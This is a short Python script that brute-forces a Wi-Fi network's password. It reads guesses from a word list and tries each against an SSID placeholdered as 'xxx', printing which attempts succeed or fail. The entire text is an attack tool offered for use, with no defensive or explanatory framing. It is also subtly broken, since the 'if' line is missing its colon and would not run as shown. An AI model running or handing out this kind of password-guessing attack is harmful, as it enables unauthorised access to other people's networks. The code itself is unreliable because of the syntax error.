from wireless import Wireless

wire = Wireless()
with open('passlist.txt', 'r') as file:
    for line in file.readlines():
        if wire.connect(ssid='xxx', password=line.strip())
            print('[+] ' + line.strip() + ' - Success!')
        else:
            print('[-] ' + line.strip() + ' - Failed!')
